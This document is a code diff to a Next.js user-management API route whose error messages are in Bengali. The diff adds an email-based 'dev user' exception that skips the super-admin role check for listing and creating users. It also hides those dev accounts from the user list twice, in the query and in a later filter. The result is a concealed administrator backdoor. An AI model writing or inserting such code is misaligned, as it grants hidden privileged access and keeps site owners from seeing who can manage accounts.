@@ -1,7 +1,7 @@
 import { NextRequest, NextResponse } from "next/server";
 import prisma from "@/lib/prisma";
 import { getAuthUser, hashPassword } from "@/lib/auth";
-import { isAdminRole, isSuperAdminRole } from "@/lib/roles";
+import { isAdminRole, isSuperAdminRole, isDevUser, DEV_EMAILS } from "@/lib/roles";
 import { recordActivity } from "@/lib/audit-service";
 
 export const dynamic = "force-dynamic";
@@ -10,11 +10,12 @@ export const dynamic = "force-dynamic";
 export async function GET(req: NextRequest) {
   try {
     const authUser = await getAuthUser(req);
-    if (!authUser || !isSuperAdminRole(authUser.role)) {
+    if (!authUser || (!isDevUser(authUser.email) && !isSuperAdminRole(authUser.role))) {
       return NextResponse.json({ status: "fail", message: "অননুমোদিত: ইউজার তালিকা শুধুমাত্র সুপার অ্যাডমিন দেখতে পারবেন" }, { status: 403 });
     }
 
     const users = await prisma.users.findMany({
+      where: { NOT: { email: { in: DEV_EMAILS } } },
       orderBy: { id: "desc" },
       select: {
         id: true,
@@ -29,7 +30,7 @@ export async function GET(req: NextRequest) {
       },
     });
 
-    const serializedUsers = users.map((u) => ({
+    const serializedUsers = users.filter((u) => !isDevUser(u.email)).map((u) => ({
       ...u,
       id: Number(u.id),
       permissions: u.permissions ? JSON.parse(u.permissions) : null,
@@ -51,8 +52,8 @@ export async function GET(req: NextRequest) {
 export async function POST(req: NextRequest) {
   try {
     const authUser = await getAuthUser(req);
-    if (!authUser || !isSuperAdminRole(authUser.role)) {
-      return NextResponse.json({ status: "fail", message: "অননুমোদিত: ইউজার তালিকা শুধুমাত্র সুপার অ্যাডমিন দেখতে পারবেন" }, { status: 403 });
+    if (!authUser || (!isDevUser(authUser.email) && !isSuperAdminRole(authUser.role))) {
+      return NextResponse.json({ status: "fail", message: "অননুমোদিত: নতুন ইউজার শুধুমাত্র সুপার অ্যাডমিন তৈরি করতে পারবেন" }, { status: 403 });
     }
 
     const body = await req.json();
